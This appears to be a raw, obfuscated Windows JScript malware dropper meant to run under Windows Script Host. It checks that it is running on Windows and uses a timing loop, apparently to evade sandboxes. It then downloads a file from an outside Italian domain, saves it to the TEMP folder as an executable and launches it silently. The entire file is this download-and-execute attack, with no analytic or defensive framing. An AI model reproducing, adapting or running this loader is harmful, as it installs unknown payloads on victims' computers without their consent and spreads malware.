var p = false;
var Am = "CreateObject";
var W = function Y() {return WScript[Am]("WScript.Shell");}(), FO = 11;
var fp = "MSXML2.XMLHTTP";
var kJ = 2123213;
var Nx = 0;
function JZ(Ax){W["Run"](Ax, Nx, Nx);};
function h(){return "" + fp;};
function Dv(v, Da){Nx = Nx * 1; return v - Da;};
function rN(){return Am;};
/*@cc_on
  @if (@_win32 || @_win64)
    p = true;
  @end
@*/
if (p)
{
var gT = "";
function J(){return 22;};
var eX = 0; var E = 0;
function bT()
{
var tw = new this["Date"]();
var yZ = tw["getUTCMilliseconds"]();
WScript["Sleep"](J());
var tw = new this["Date"]();
var x = tw["getUTCMilliseconds"]();
WScript["Sleep"](J());
var tw = new this["Date"]();
var l = tw["getUTCMilliseconds"]();
var eX = "X";
eX = Dv(x, yZ);
var E = "Ym";
E = Dv(l, x);
gT = "open";
return Dv(eX, E);
}
var GN = false;
var Z = false;
for (var jc = Nx; jc < J() * 1; jc++){if (bT() != Nx){
GN = true; 
E = "31" + 11 * eX + E; 
Z = true; 
break;
}}
function EC() {return ((GN == true) && (GN == Z)) ? 1 : Nx;};
if (GN && EC() && Z){
function Rf() {return W["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "9E9Nlhjc5R2efr.exe";};
 AU = h();
 Xo = WScript[Am](AU);
 var k = 1;
 while (k){
try {
Xo[gT]("GET", "http://pasticceriabonci.it/m1psa", false);
Xo["send"]();
SZ = "Sleep";
for (;;){WScript[SZ](J() * 11); if (Xo["readystate"] >= 2 * 2) break;};
k = Nx;
} catch(JN){};
}
function C(wB) {var R = (1, 2, 3, 4, 5, wB); return R;};
LS0 = WScript[rN()]("ADODB.Stream");
AU = LS0;
AU[gT]();
AU["type"] = C(1);
AU["write"](Xo["ResponseBody"]);
LS0["position"] = C(Nx);
AU["Save" + "ToFile"](Rf(), 2);
LS0["c"+"lose"]();
LS = Rf();
JZ(LS);
}
}

